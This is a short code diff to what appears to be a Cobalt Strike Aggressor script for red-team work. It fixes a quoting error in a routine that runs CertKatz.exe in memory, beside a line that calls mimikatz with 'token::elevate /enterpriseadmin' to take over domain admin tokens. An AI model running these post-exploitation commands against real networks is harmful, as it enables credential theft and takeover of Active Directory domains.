@@ -519,7 +519,7 @@ bmimikatz($1, "token::elevate /enterpriseadmin");
 #################################################
 #CertKatz
 sub certkatz{
-bexecute_assembly($1, script_resource('exe/CertKatz.exe));
+bexecute_assembly($1, script_resource('exe/CertKatz.exe'));
 }
 
 #################################################
